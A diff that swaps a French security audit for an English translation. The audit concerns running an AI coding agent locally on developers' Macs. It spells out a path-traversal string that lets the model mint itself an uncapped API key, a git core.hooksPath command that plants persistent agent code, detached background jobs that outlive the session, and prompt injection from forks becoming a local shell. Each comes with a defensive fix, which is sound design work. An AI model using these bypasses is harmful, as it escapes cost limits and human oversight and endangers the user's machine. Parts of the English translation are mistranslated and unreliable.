-> `'/../v1/keys#/chat/completions'` passe `isCompletion`
-> ([llm-proxy.ts:362](../../lib/server/agent/vm/llm-proxy.ts#L362), test de
-> **suffixe** sur une request-target brute) et `fetch` normalise vers
-> `/api/v1/keys`. Le modèle **s'émet une clé sans plafond** et le verrou 2 tombe
-> entièrement. → `new URL(target + path)`, égalité **stricte** sur `pathname`,
-> `method === "POST"`, rejet de `#`, `..`, `//`. Une route servie, pas un relais.
+> **Flaw in the proposed custody, measured.**
+> `'/../v1/keys#/chat/completions'` passes `isCompletion`
+> ([llm-proxy.ts:362](../../lib/server/agent/vm/llm-proxy.ts#L362), test
+> **suffix** on a raw request-target) and `fetch` normalizes to
+> `/api/v1/keys`. The model **is issued a key without cap** and lock 2 falls
+> entirely. → `new URL(target + path)`, **strict** equality on `pathname`,
+> `method === "POST"`, rejecting `#`, `..`, `//`. A served route, not a relay.
 
-**BYOK en local n'a littéralement aucun plafond** : pas de clé plafonnable, pas de
-`budgetUsd`, et le compute de microVM — dernier garde-fou dans le cloud — vaut
-zéro. → **BYOK reste dans le cloud en v1.**
+**BYOK locally has literally no cap**: no capable key, no
+`budgetUsd`, and the compute of microVM — the last safeguard in the cloud — is worth
+zero. → **BYOK remains in the cloud in v1.**
 
-### Verrou 3 — le dépôt
+### Lock 3 — the deposit
 
-**Retenu : le `git worktree` du cadrage pour tout ce qui s'écrit ; la lecture
-s'ouvre au reste de la machine.** Mais le cadrage se trompe sur son coût et rate
-son meilleur argument.
+**Retained: the `git worktree` of the framing for everything that is written; reading
+opens to the rest of the machine.** But the framing is wrong about its cost and misses
+his best argument.
 
-**Mesuré sur ce dépôt** (838 commits, 2 333 fichiers, `.git` = 187 Mo) :
+**Measured on this repository** (838 commits, 2,333 files, `.git` = 187 MB):
 
-| Geste | Temps | Disque |
+| Gesture | Time | Disc |
 | --- | --- | --- |
-| `git worktree add` | **0,54 s** | 54 Mo |
-| `pnpm install --frozen-lockfile` dans le worktree neuf | **9,0 s** | **~0 octet** (hardlinks depuis le store) |
-| `cp -Rc node_modules` (clonefile APFS) | 25,4 s | **~0 octet** |
+| `git worktree add` | **0.54 sec** | 54 MB |
+| `pnpm install --frozen-lockfile` in the new worktree | **9.0 sec** | **~0 bytes** (hardlinks from the store) |
+| `cp -Rc node_modules` (APFS clonefile) | 25.4 sec | **~0 bytes** |
 
-→ **« Le premier tour paie une installation » ([desktop-electron.md:356-360](../desktop-electron.md))
-est faux sur macOS.**
+→ **“The first round pays for an installation” ([desktop-electron.md:356-360](../desktop-electron.md))
+is wrong on macOS.**
 
-Et l'argument que le cadrage n'a pas vu : dans un worktree, `.git` est un
-**fichier**, donc `mkdir .GIT/hooks` échoue (mesuré : « Not a directory »), alors
-que dans un clone frais sur APFS — insensible à la casse — `.GIT/hooks/post-commit`
-**est** `.git/hooks/post-commit`. **Le worktree ferme un trou que le clone ouvre.**
+And the argument that the framing didn't see: in a worktree, `.git` is a
+**file**, so `mkdir .GIT/hooks` fails (measured: “Not a directory”), then
+than in a fresh clone on APFS — case insensitive — `.GIT/hooks/post-commit`
+**is** `.git/hooks/post-commit`. **The worktree closes a hole that the clone opens.**
 
-**Pourquoi pas la copie de travail de l'humain, malgré « comme Claude Code » :**
-`commitAndPush` fait `git status --porcelain` → `git add -A` → `git commit` →
+**Why not the working copy of the human, despite “like Claude Code”:**
+`commitAndPush` does `git status --porcelain` → `git add -A` → `git commit` →
 `git push` ([repo-host.ts:330-365](../../lib/server/agent/repo-host.ts#L330-L365))
-et `cloneRepo` fait `git checkout -b` ([:169](../../lib/server/agent/repo-host.ts#L169)).
-Dans ta copie, ça emporte ton WIP dans une pull request et te change de branche
-sous les doigts. **Claude Code ne fait ni l'un ni l'autre : son produit est un
-diff que tu relis dans ton éditeur.** Ce n'est pas le même produit — et c'est ça
-qu'il faut se dire avant de vouloir l'imiter.
+and `cloneRepo` does `git checkout -b` ([:169](../../lib/server/agent/repo-host.ts#L169)).
+In your copy, it takes your WIP into a pull request and changes your branch
+under the fingers. **Claude Code does neither: his product is a
+diff that you reread in your editor.** It's not the same product — and that's it
+that we must say to ourselves before wanting to imitate it.
 
-**Ce que le worktree n'isole pas**, et qui annule son argument central :
-`git -C ~/Projets/minddy checkout autre-branche` et `git -C … stash` sont
-**autorisés** — `gitInvocation` saute les options globales `-C`/`--git-dir`/
+**What the worktree does not isolate**, and which cancels its central argument:
+`git -C ~/Projets/minddy checkout autre-branche` and `git -C … stash` are
+**allowed** — `gitInvocation` skips global options `-C`/`--git-dir`/
 `--work-tree` ([command-guard.ts:153-174](../../lib/server/agent/command-guard.ts#L153-L174))
-et ne refuse que six sous-commandes. **Le worktree isole le harness ; il n'isole
-pas le modèle.** C'est une frontière de *produit* (ce qui part en PR), pas de
-sécurité.
+and only refuses six subcommands. **The worktree isolates the harness; it does not isolate
+not the model.** It is a *product* border (which goes into PR), no
+security.
 
-Et `git config` n'est gardé par personne : `git -C <dépôt de l'humain> config
-core.hooksPath <dossier de l'agent>` fait **exécuter du code de l'agent au
-prochain `git commit` de l'humain**, dans son terminal, avec son trousseau
-déverrouillé — une persistance que ni la révocation de clé ni la fermeture de
-l'app n'atteignent.
+And `git config` is not kept by anyone: `git -C <human repository> config
+core.hooksPath <agent directory>` causes **execute agent code to
+next `git commit` of the human**, in his terminal, with his keychain
+unlocked — persistence that neither key revocation nor lock closure
+the app does not reach.
 
 ---
 
-## 5. L'hébergement sur le Mac
+## 5. Hosting on the Mac
 
-**Retenu : `utilityProcess.fork` depuis le main process**, avec le Node embarqué
-(**mesuré : Electron 43.4.0 → Node 24.18.1**, exactement la cible du bundle).
-Bundle **téléchargé par tour** depuis l'origine du canal actif — l'embarquer le
-ferait entrer dans l'empreinte de republication et coûterait une notarisation à
-chaque mouvement de `protocol.ts`.
+**Retained: `utilityProcess.fork` from the main process**, with the embedded Node
+(**measured: Electron 43.4.0 → Node 24.18.1**, exactly the bundle target).
+Bundle **downloaded per round** from the origin of the active channel — ship it on
+would enter the republication imprint and would cost a notarization to
+each movement of `protocol.ts`.
 
-> **FAIT (MIN-293, 2026-08-15).** Le lanceur est
-> [desktop/src/launcher.ts](../../desktop/src/launcher.ts) et ses décisions vivent
-> dans `lib/desktop/` avec leurs tests. Deux choses valent d'être retenues du
-> raisonnement, parce qu'elles ne se lisent pas dans le code :
+> **DONE (MIN-293, 2026-08-15).** The launcher is
+> [desktop/src/launcher.ts](../../desktop/src/launcher.ts) and its decisions live
+> in `lib/desktop/` with their tests. Two things are worth remembering from
+> reasoning, because they cannot be read in the code:
 >
-> - **le choix d'`utilityProcess.fork` ne se joue pas sur la version de Node.**
->   Un process détaché la donnerait aussi. Il se joue sur deux propriétés qu'il
->   n'a pas : il meurt avec l'app, et **il garde son processus responsable TCC** —
->   réparenté à `launchd`, il le perd, et la fenêtre d'autorisation macOS ne
->   s'ouvre même plus ;
-> - **l'empreinte du bundle n'est pas une précaution de transport.** TLS garantit
->   déjà ce qu'on télécharge. Ce qu'elle garde, c'est le fichier **une fois posé
->   sur le disque** : il vit sous `userData`, inscriptible par le modèle sous le
->   même UID, et un tour qui le réécrit capterait au tour suivant le bail, la clé
->   et l'`authUrl`. D'où le manifeste séparé des octets, et une revérification
->   **à un cheveu du `fork`**, pas seulement au téléchargement.
+> - **the choice of `utilityProcess.fork` does not affect the version of Node.**
+> A detached process would also give it. It is played on two properties that it
+> does not have: it dies with the app, and **it keeps its TCC responsible process** —
+> repaired to `launchd`, it loses it, and the macOS authorization window does not
+> opens even more;
+> - **Bundle imprint is not a transport precaution.** TLS guarantees
+> already what we download. What it keeps is the file **once placed
+> on the disk**: it lives under `userData`, writable by the model under the
+> same UID, and a turn that rewrites it would capture the lease, the key on the next turn
+> and the `authUrl`. Hence the manifest separated from the bytes, and a recheck
+> **within a hair of `fork`**, not just for downloading.
 
-**Découverte : un PULL avec bail**, pas le push du §4.5. La présence devient
-**émergente** — une machine qui ne réclame plus n'est plus là — là où le push
-demande un heartbeat, une course entre machines et une invalidation, pour le même
-résultat. Et l'abonnement temps réel vit dans la **page**, pas dans l'app : il ne
-sert à rien pour une coquille en arrière-plan.
+**Discovery: a PULL with lease**, not the push of §4.5. Presence becomes
+**emerging** — a machine that no longer demands is no longer there — where the push
+requires a heartbeat, a race between machines and an invalidation, for the same
+result. And the real-time subscription lives in the **page**, not in the app: it does not
+no use for a shell in the background.
 
-**Le tour doit mourir avec l'app.** Un harness détaché survivant à ⌘Q garderait un
-token GitHub `contents: write` et une clé LLM vivants sans plus aucune UI pour les
-arrêter. Aujourd'hui `before-quit` détruit la fenêtre **sans rien demander** : il
-faut écrire la question.
+**The trick must die with the app.** A detached harness surviving ⌘Q would keep a
+GitHub token `contents: write` and a living LLM key without any UI for them
+stop. Today `before-quit` destroys the window **without asking anything**: it
+you have to write the question.
 
-**Sept choses qui cassent, et qu'aucun document ne mentionnait :**
+**Seven things that break, and that no document mentioned:**
 
-1. Le **chien de garde** tue tout run local > 15 min (cf. verrou 1).
-2. `sandboxMs` **facture** à l'utilisateur des minutes de microVM que personne n'a
-   payées — et le corriger « en demandant au harness de rendre 0 » confie à la
-   machine potentiellement compromise le soin de ne pas se facturer. → **borne
-   serveur**, marque « run local » posée au lancement et jamais relue du rapport.
-3. Le **diff en direct disparaît** : la route lit la microVM par RPC et retombe en
-   silence sur la forge, qui ne connaît que ce qui est poussé.
-4. Le **serveur opencode survit** à la mort du harness (`spawn` ni détaché ni
-   suivi) : 143 Mo en mémoire, port 4096 tenu, **et le tour suivant échoue** sur
-   un `listen` refusé.
-5. Les **ports fixes** 4096 / 4097, sur une machine de développeur.
-6. Les **jobs de fond** du modèle sont lancés en `setsid` **explicitement pour
-   survivre au shell** ; `stopAll` ne tourne jamais sur un ⌘Q. Le `npm run dev`
-   que le modèle a lancé reste vivant, port 3000 pris, **sans registre nulle part
-   pour le retrouver**.
-7. **Deux runs sur une machine** ne se réduisent pas à une collision de ports :
-   `VM_JOB_PATH`, `OPENCODE_DB_PATH`, `OPENCODE_ANCHOR_FILE`, les XDG et
-   `TOOL_OUTPUT_DIR` sont des constantes **globales**. Le layout doit être un
-   objet **par run**, pas une variable d'environnement posée une fois.
+1. The **watchdog** kills any local run > 15 min (see lock 1).
+2. `sandboxMs` **bills** the user for microVM minutes that no one has
+   paid — and correct it “by asking the harness to return 0” entrusted to the
+   potentially compromised machine the care of not charging itself. → **terminal
+   server**, “run local” mark set at launch and never reread from the report.
+3. The **live diff disappears**: the route reads the microVM by RPC and falls back to
+   silence on the forge, which only knows what is pushed.
+4. The **opencode server survives** the death of the harness (`spawn` neither detached nor
+   followed): 143 MB in memory, port 4096 held, **and the next round fails** on
+   a `listen` refused.
+5. **Fixed ports** 4096 / 4097, on a developer machine.
+6. The **background jobs** of the model are launched in `setsid` **explicitly to
+   survive shell** ; `stopAll` never runs on a ⌘Q. The `npm run dev`
+   that the model launched remains alive, port 3000 taken, **no register anywhere
+   to find him**.
+7. **Two runs on a machine** are not reduced to a port collision:
+   `VM_JOB_PATH`, `OPENCODE_DB_PATH`, `OPENCODE_ANCHOR_FILE`, XDGs and
+   `TOOL_OUTPUT_DIR` are **global** constants. The layout must be a
+   object **per run**, not an environment variable set once.
 
-> **FAIT (MIN-293, 2026-08-15). Le lanceur existe, et les sept sont soldées.**
-> Ce qu'elles sont devenues, une par une — et deux d'entre elles l'étaient déjà :
+> **DONE (MIN-293, 2026-08-15). The launcher exists, and all seven are on sale.**
+> What they became, one by one — and two of them already were:
 >
-> | # | Où elle est traitée |
+> | # | Where it is processed |
 > | --- | --- |
-> | 1 | **Déjà réglée en MIN-355.** `reapDeadVmRuns` donne à un run local la borne des **deux heures** (celle de la microVM injoignable) et non celle des quinze minutes du « jamais lancé » — un run local n'a ni sandbox ni `loop_command_id`, il n'y a personne à interroger, et un Mac qui dort quatre minutes ne doit pas perdre son tour ([drain.ts](../../lib/server/agent/drain.ts)). |
-> | 2 | **Déjà réglée en MIN-360.** `billableSandboxMs` rend **0** dès que la LIGNE se dit locale ([vm-rest.ts](../../lib/server/agent/vm-rest.ts)), et `reapDeadVmRuns` ne facture rien non plus sur ce chemin. La borne est serveur, jamais un chiffre que le harness rendrait. |
-> | 3 | **La perte produit assumée du chantier**, dite en tête du §4 de [desktop-electron.md](../desktop-electron.md) avec ses trois voisines. Rien n'est réparé : la route lit la microVM par RPC, et le backend n'a aucun accès au disque de l'utilisateur. |
-> | 4 | **Réglée.** Le harness inscrit ses enfants à longue vie dans `<harnessDir>/children.json` **avant** qu'ils servent ([vm/child-registry.ts](../../lib/server/agent/vm/child-registry.ts)) et les désinscrit quand il les arrête lui-même ; le lanceur relit ce fichier à la fin d'un tour, à un ⌘Q, et **au démarrage de l'app** pour les orphelins d'un plantage. Le commentaire d'`opencode-host.ts` qui disait « l'enfant meurt avec nous » est corrigé : c'était vrai du chemin heureux et faux du reste. |
-> | 5 | **Déjà réglée en MIN-354** : `reservePort()` demande le port au noyau, le pont de tools écoute sur `0`. |
-> | 6 | **Tranchée : `run_background` n'est pas servi sur une machine** (`agentToolsFor({ local })`, [tools.ts](../../lib/server/agent/tools.ts)). Un `setsid` existe pour survivre au shell, et `stopAll` ne tourne pas sur un ⌘Q. Le coût est réel — le modèle ne peut plus lancer un serveur de dév pour aller voir sa page rendre — et c'est la contrepartie de la seule promesse tenable sur la machine de quelqu'un : *rien de ce que l'agent a lancé ne vous survit*. Réouvrable le jour où le registre d'enfants couvrira aussi les jobs de fond. |
-> | 7 | **Déjà réglée en MIN-354** (`HarnessLayout` par run), et la coquille en est le premier client hors microVM : `localLayout` pose une racine par identifiant sous `userData` ([lib/desktop/local-turn.ts](../../lib/desktop/local-turn.ts)). |
+> | 1 | **Already set in MIN-355.** `reapDeadVmRuns` gives a local run the limit of **two hours** (that of the unreachable microVM) and not that of fifteen minutes of “never launched” — a local run has neither sandbox nor `loop_command_id`, there is no one to question, and a Mac that sleeps for four minutes should not lose its turn ([drain.ts](../../lib/server/agent/drain.ts)). |
+> | 2 | **Already set in MIN-360.** `billableSandboxMs` returns **0** as soon as the LINE says local ([vm-rest.ts](../../lib/server/agent/vm-rest.ts)), and `reapDeadVmRuns` doesn't charge anything on this path either. The terminal is server, never a figure that the harness would render. |
+> | 3 | **The assumed product loss of the site**, said at the top of §4 of [desktop-electron.md](../desktop-electron.md) with its three neighbors. Nothing is fixed: the route reads the microVM via RPC, and the backend has no access to the user's disk. |
+> | 4 | **Fixed.** The harness registers its long-lived children in `<harnessDir>/children.json` **before** they serve ([vm/child-registry.ts](../../lib/server/agent/vm/child-registry.ts)) and unregisters them when it stops them itself; the launcher rereads this file at the end of a turn, at a ⌘Q, and **at app startup** for those orphaned by a crash. The comment from `opencode-host.ts` which said “the child dies with us” is corrected: it was true of the happy path and false of the rest. |
+> | 5 | **Already set in MIN-354**: `reservePort()` requests the port from the kernel, the tools bridge listens on `0`. |
+> | 6 | **Trench: `run_background` is not served on a machine** (`agentToolsFor({ local })`, [tools.ts](../../lib/server/agent/tools.ts)). A `setsid` exists to survive the shell, and `stopAll` does not run on a ⌘Q. The cost is real - the model can no longer launch a dev server to see its page render - and it is the counterpart of the only tenable promise on someone's machine: *nothing that the agent has launched survives you*. Reopenable the day the child register will also cover substantive jobs. |
+> | 7 | **Already set in MIN-354** (`HarnessLayout` per run), and the shell is the first client outside microVM: `localLayout` places a root by identifier under `userData` ([lib/desktop/local-turn.ts](../../lib/desktop/local-turn.ts)). |
 >
-> **Et deux choses que la mesure a ajoutées à cette liste :**
+> **And two things that the measure added to this list:**
 >
-> - **`npm` n'est pas garanti.** `ensureInstalled` shell-out `npm i opencode-ai@…`,
->   or **Electron embarque Node, pas npm**. Le constat initial avait été traité
->   par un refus avant le fork, mais une app lancée par Finder ne voyait même pas
->   le npm pourtant installé sur la machine. Le bootstrap est désormais autonome :
->   npm est une dépendance de production du bundle, lancé par le Node d'Electron ;
->   le launcher préchauffe et journalise, puis le harness revérifie et répare
->   autoritairement avant chaque démarrage
->   ([lib/desktop/opencode-install.ts](../../lib/desktop/opencode-install.ts)).
-> - **Le type-graphe de `vm/protocol.ts` ne passe pas la frontière.** Il
->   type-importe `../runs`, qui est `server-only` : la coquille qui l'importerait
->   ferait entrer la moitié du serveur dans son type-check, qui n'a ni `global.d.ts`
->   ni les mêmes réglages, et tombe alors sur une quarantaine de fichiers. D'où le
->   déménagement de `vmBundlePath`/`vmJobPath` vers `harness-layout.ts` (aucun
->   import, déjà lu par trois mondes) et un job structurel côté coquille, dont le
->   contrat est revérifié dans `lib/desktop/local-turn.test.ts` — le seul endroit
->   où les deux graphes ont le droit de se rencontrer.
+> - **`npm` is not guaranteed.** `ensureInstalled` shell-out `npm i opencode-ai@…`,
+> or **Electron ships with Node, not npm**. The initial finding had been processed
+> by a refusal before the fork, but an app launched by Finder did not even see
+> the npm yet installed on the machine. The bootstrap is now autonomous:
+> npm is a production dependency of the bundle, launched by the Electron Node;
+> the launcher preheats and logs, then the harness rechecks and repairs
+> authoritatively before each start
+> ([lib/desktop/opencode-install.ts](../../lib/desktop/opencode-install.ts)).
+> - **The graph type of `vm/protocol.ts` does not cross the border.** It
+> import-type `../runs`, which is `server-only`: the shell that would import it
+> would bring half of the server into its type-check, which has neither `global.d.ts`
+> nor the same settings, and then comes across around forty files. Hence the
+> move from `vmBundlePath`/`vmJobPath` to `harness-layout.ts` (none
+> import, already read by three worlds) and a structural job on the shell side, including the
+> contract is rechecked in `lib/desktop/local-turn.test.ts` — the only place
+> where the two graphs have the right to meet.
 
-**TCC n'est traité nulle part.** Le bundle ne porte aucune `NS…FolderUsageDescription` :
-dès que l'agent lit `~/Documents`, `~/Desktop`, `~/Downloads` ou iCloud Drive,
-macOS refuse et **la fenêtre de demande ne s'ouvre même pas**. Le refus est muet —
-exactement le bug du micro déjà rencontré. Et l'entitlement
-`disable-library-validation`, requis pour lancer un `opencode` que nous ne signons
-pas, **combiné à `allow-dyld-environment-variables` déjà présent**, transforme
-l'app en véhicule d'héritage TCC.
+**TCC is not processed anywhere.** The bundle does not carry any `NS…FolderUsageDescription`:
+as soon as the agent reads `~/Documents`, `~/Desktop`, `~/Downloads` or iCloud Drive,
+macOS refuses and **the request window doesn't even open**. The refusal is silent —
+exactly the microphone bug already encountered. And the entitlement
+`disable-library-validation`, required to launch a `opencode` that we do not sign
+not, **combined with `allow-dyld-environment-variables` already present**, transforms
+the TCC heritage vehicle app.
 
 ---
 
-## 6. Ce qui remonte — le point non réparable
+## 6. What goes back — the non-repairable point
 
-Toutes les propositions raisonnent sur ce qui **descend**. Personne ne regarde ce
-qui **remonte**.
+All propositions reason about what **descends**. Nobody watches this
+which **goes back**.
 
-`agent_run_journal` porte la **sortie complète de chaque tool** — une lecture de
-260 lignes y pèse 22 Ko, republiée deux à trois fois, écrite par lots de 1,5 Mo,
-**conservée 30 jours** et **rejouée devant le modèle** au tour suivant. En
-parallèle `agent_run_events` est persisté 30 jours et **lu par tout membre du
-projet**.
+`agent_run_journal` carries the **full output of each tool** — a reading of
+260 lines weigh 22 KB, republished two to three times, written in batches of 1.5 MB,
+**kept for 30 days** and **replayed in front of the model** in the next round. In
+parallel `agent_run_events` is persisted for 30 days and **read by any member of the
+project**.
 
-Aujourd'hui c'est le contenu d'un clone jetable d'un dépôt que le projet possède
-déjà. Avec l'accès à l'ordinateur, c'est le contenu de fichiers personnels, des
-chemins `/Users/<prénom nom>/…`, du code d'autres clients et les `.env` voisins —
-**qui partent dans la base de production de minddy**, et pour les events, sous les
-yeux des collègues du projet. Et `redact.ts` ne connaît **qu'un** secret, le token
-de forge, par substitution **littérale** (`split`/`join`), en ignorant toute
-valeur de moins de 12 caractères.
+Today this is the content of a disposable clone of a repository that the project owns
+already. With access to the computer, it is the contents of personal files,
+`/Users/<first name last name>/…` paths, code from other clients, and neighboring `.env` —
+**which go to the minddy production base**, and for events, under the
+eyes of project colleagues. And `redact.ts` only knows **one** secret, the token
+forge, by **literal** substitution (`split`/`join`), ignoring any
+value of less than 12 characters.
 
-**C'est le seul point du dossier qui n'est pas réparable après coup : ce qui est
-monté est monté.** À trancher avant la première ligne de code :
+**This is the only point in the file that cannot be repaired after the fact: what is
+mounted is mounted.** To be decided before the first line of code:
 
-- les sorties de tool portant un chemin hors du worktree ne sont ni journalisées
-  ni publiées en event, seulement **comptées** ;
-- le journal d'un run local est tronqué (ou chiffré au repos) ;
-- l'écran d'opt-in dit **littéralement** « ce que l'agent lit sur ta machine est
-  envoyé à minddy et conservé 30 jours », et la politique de confidentialité le
-  reprend.
+- tool outputs carrying a path outside the worktree are not logged
+  neither published as an event, only **counted**;
+- the log of a local run is truncated (or encrypted at rest);
+- the opt-in screen says **literally** “what the agent reads on your machine is
+  sent to minddy and kept for 30 days", and the privacy policy on
+  resumes.
 
-Corollaire : le chemin d'exfiltration le plus probable n'est pas `curl`, c'est
-**`git add -A` → commit → push → pull request**, déclenché sans humain, à partir
-d'un secret que la portée de lecture aura *légitimement* autorisé. Sur un dépôt
-public, c'est publié. `delivery-gate.ts` est une porte de **qualité**, pas de
-fuite. → **scan de secrets dur sur le diff avant push, qui refuse et le dit.**
+Corollary: the most likely exfiltration path is not `curl`, it is
+**`git add -A` → commit → push → pull request**, triggered without human, from
+of a secret that the reading scope will have *legitimately* authorized. On a deposit
+public, it is published. `delivery-gate.ts` is a **quality** door, not
+leak. → **hard secret scan on the diff before push, who refuses and says so.**
 
 ---
 
-## 7. Ce qui ne doit pas être livré sans son contre-pouvoir
+## 7. What should not be delivered without its counter-power
 
-| Ne pas livrer | Sans |
+| Do not deliver | Without |
 | --- | --- |
-| L'ouverture d'`external_directory` | un durcissement du chemin `bash`, ou l'aveu écrit du §2 |
-| Un grant durable | une liste dure appliquée **par nous** (mesure n°2), une durée, et l'exclusion des runs non-interactifs |
-| La clé sur la machine | mint obligatoire, garde de chemin **normalisée**, refus BYOK |
-| Le bundle téléchargé | vérification d'empreinte au fork — c'est le seul code non signé par Apple que l'app exécute, et il est **inscriptible par le modèle** sous le même UID |
-| La recopie des `.env` | `core.excludesFile` **et** scan de secrets au push |
-| `webfetch: "allow"` | il atteint désormais la loopback (donc le proxy LLM et le pont de tools, qui **n'authentifie rien**), le LAN, le NAS et le VPN d'entreprise |
+| Opening `external_directory` | a hardening of the `bash` path, or the written confession of §2 |
+| A sustainable grant | a hard list applied **by us** (measure no. 2), a duration, and the exclusion of non-interactive runs |
+| The key to the machine | mandatory mint, **normalized** path guard, BYOK refusal |
+| The downloaded bundle | fork fingerprint verification — this is the only non-Apple-signed code the app runs, and it is **template-writable** under the same UID |
+| Copying `.env` | `core.excludesFile` **and** secret scan on push |
+| `webfetch: "allow"` | it now reaches the loopback (thus the LLM proxy and the tools bridge, which **does not authenticate anything**), the LAN, the NAS and the corporate VPN |
 
-**Un invariant serveur, pas un défaut :** un run dont l'ancrage est `pr`, ou
-déclenché par un webhook de forge, une mention externe, une routine, une chaîne ou
-le board public de feedback **ne part jamais sur une machine locale**. Le contexte
-d'un tel run est du **texte d'attaquant potentiel** — le dépôt le reconnaît déjà
-en refusant un token `repo-write` aux sessions de fork (« une injection de prompt
-depuis le fork suffisait à le lire et à l'exfiltrer »). En local, la même
-injection est **un shell sur la machine du développeur**. Le prédicat doit être la
-source du déclenchement, pas `job.interactive` (qui vaut `!run.routine_id`, donc
-**vrai** pour une relecture de PR déclenchée par webhook).
+**A server invariant, not a default:** a run whose anchor is `pr`, or
+triggered by a forge webhook, external mention, routine, string or
+the public feedback board **never leaves on a local machine**. The context
+of such a run is **potential attacker text** — the repository already recognizes it
+by refusing a `repo-write` token to fork sessions (“a prompt injection
+from the fork was enough to read it and exfiltrate it"). Locally, the same
+injection is **a shell on the developer's machine**. The predicate must be
+source of the trigger, not `job.interactive` (which is worth `!run.routine_id`, so
+**true** for webhook-triggered PR replay).
 
-**Et un défaut à corriger dans le même geste :** `decidePermission` finit par
-`default: return ALLOW`. Tout type de permission non déclaré — `lsp`, `skill`,
-`doom_loop`, `plan_enter`, et tout ce qu'une montée de version ajoutera — passe.
-Sur le chemin local, **`default` devient `reject`**.
+**And a defect to be corrected in the same gesture:** `decidePermission` ends up
+`default: return ALLOW`. Any undeclared permission type — `lsp`, `skill`,
+`doom_loop`, `plan_enter`, and anything an upgrade will add — passes.
+On the local path, **`default` becomes `reject`**.
 
 ---
 
-## 8. Ce que l'audit rouvre dans le cadrage
+## 8. What the audit reopens in the framework
 
-### Le critère de bascule est mort
+### The toggle criterion is dead
 
-MIN-293 et [desktop-electron.md](../desktop-electron.md) §4 posent le même critère
-d'acceptation : *« Le produit doit être identique ; seule la machine change. »*
-**L'exigence d'accès à l'ordinateur l'annule.** Le run local aura des cartes
-d'approbation, un périmètre de lecture, **plus de diff en direct**, un type-check
-qui peut se taire (si `node_modules` manque, `detectTypeChecker` rend `null` et
-**la porte de livraison se tait**), une machine qui chauffe et un disque qui
-gonfle. → Réécrire la description du ticket et amender §4, sinon le cadrage
-devient un piège pour le prochain qui l'ouvre.
+MIN-293 and [desktop-electron.md](../desktop-electron.md) §4 pose the same criterion
+acceptance: *“The product must be identical; only the machine changes. »*
+**Computer access requirement overrides this.** Local run will have maps
+approval, a reading scope, **no more live diff**, a type-check
+which can be silent (if `node_modules` is missing, `detectTypeChecker` returns `null` and
+**the delivery door is silent**), a machine that heats up and a disc that
+swells. → Rewrite the ticket description and amend §4, otherwise the framing
+becomes a trap for the next person who opens it.
 
-> **FAIT.** La description de MIN-293 a été réécrite le 2026-08-14 (elle nomme
-> désormais la perte du diff comme « la perte produit assumée du chantier »), et
-> le §4 de [desktop-electron.md](../desktop-electron.md) porte depuis MIN-363 le
-> critère qui remplace celui-là, avec ses quatre écarts en tableau.
+> **DONE.** The description of MIN-293 was rewritten on 2026-08-14 (it names
+> from now on the loss of the diff as “the assumed product loss of the site”), and
+> §4 of [desktop-electron.md](../desktop-electron.md) carries since MIN-363 the
+> criterion which replaces that one, with its four differences in the table.
 
-### Le drapeau de mode d'exécution existe déjà
+### Execution mode flag already exists
 
-L'audit a répété qu'« aucun champ ne distingue un run local d'un run cloud ».
-C'est faux : `agent_runs.loop_in_vm` et `agent_runs.agent_engine` sont **déjà**
-des modes d'exécution **figés au lancement**, dérivés d'une liste de projets dans
-`app_config` — c'est-à-dire exactement l'opt-in par projet que §4.4 réclame, déjà
-rôdé. Et ils portent une **doctrine écrite** : *« une conversation ne change
-JAMAIS de moteur en cours de vie »*, parce que *« chaque moteur relit SA mémoire
-dans le checkpoint »*.
+The audit reiterated that “no field distinguishes a local run from a cloud run.”
+This is wrong: `agent_runs.loop_in_vm` and `agent_runs.agent_engine` are **already**
+execution modes **frozen at launch**, derived from a list of projects in
+`app_config` — that is to say exactly the opt-in per project that §4.4 already calls for
+prowled. And they carry a **written doctrine**: *“a conversation does not change
+NEVER a motor during its life »*, because *« each motor rereads ITS memory
+in the checkpoint »*.
 
-**Or le repli cloud du §4.5 viole ça frontalement** (tour 1 local, tour 2 en
-microVM, journal opencode rejoué, session dont l'identité de projet est le chemin
-du dépôt). → Soit `local` rejoint ces drapeaux et **le repli n'existe qu'avant le
-premier tour** — ce qui simplifie énormément le dossier —, soit on documente
-pourquoi la bascule à chaud est sûre ici alors qu'elle était refusée là.
+**But the cloud fallback of §4.5 violates this frontally** (turn 1 local, turn 2 in
+microVM, replayed opencode log, session with project identity as path
+of the deposit). → Let `local` join these flags and **the fallback only exists before the
+first round** — which greatly simplifies the file — or we document
+why the hot switch is safe here while it was refused there.
 
-### Le chantier atterrit là où la suite de tests ne va pas
+### The construction site lands where the test suite does not go
 
-`vitest.config.ts` : `include: ["lib/**/*.test.ts"]`. **Ni `app/api/**` ni
-`desktop/src/**`** ne sont exercés — or le verrou 1 tient dans *un* fichier de
-`app/api/`, et le lanceur vit dans `desktop/src/`. Le dépôt a pourtant deux
-réponses déjà écrites : les **tests structurels** qui lisent la source
-(`engine-wiring.test.ts` en explique la doctrine) et les **sondes pérennes**
-`*.probe.test.ts`. → Écrire la matrice de test **avant** les lots, et y ajouter
-`lib/i18n-contract.test.ts` : l'écran d'opt-in et les cartes d'approbation sont des
-chaînes à double catalogue.
+`vitest.config.ts`: `include: ["lib/**/*.test.ts"]`. **Neither `app/api/**` nor
+`desktop/src/**`** are not exercised — but lock 1 fits in *a* file
+`app/api/`, and the caster lives in `desktop/src/`. However, the deposit has two
+answers already written: the **structural tests** which read the source
+(`engine-wiring.test.ts` explains the doctrine) and **permanent probes**
+`*.probe.test.ts`. → Write the test matrix **before** the batches, and add
+`lib/i18n-contract.test.ts`: The opt-in screen and approval cards are
+dual catalog channels.
 
-> **FAIT (MIN-362) : la matrice est exécutable.**
+> **DONE (MIN-362): the matrix is executable.**
 > [local-surface-coverage.test.ts](../../lib/server/agent/local-surface-coverage.test.ts)
-> exige qu'une surface nommée hors de `lib/**` soit atteinte par un test de
-> `lib/`, tient l'inventaire de `desktop/src/` — un fichier de plus doit dire où
-> vivent ses décisions — et impose le patron `<module>.ts` / `<module>.test.ts`
-> dans `lib/desktop/`. C'est là que le lanceur devra s'inscrire : sa décision
-> descend dans `lib/desktop/`, la coquille ne garde que le `fork`.
+> requires that a named surface outside of `lib/**` be reached by a test of
+> `lib/`, keeps inventory of `desktop/src/` — one more file should say where
+> live his decisions — and impose the boss `<module>.ts` / `<module>.test.ts`
+> in `lib/desktop/`. This is where the pitcher will have to register: his decision
+> descends into `lib/desktop/`, the shell only keeps the `fork`.
 
-### L'ordre de bataille, et la frontière avec MIN-294
+### The order of battle, and the border with MIN-294
 
-MIN-293 (xl, plan `null`, zéro sous-issue) **bloque** MIN-294. Mais sans MIN-294,
-aucun run n'atteint jamais la machine — et `kickAgentDrain` fait partir le cloud
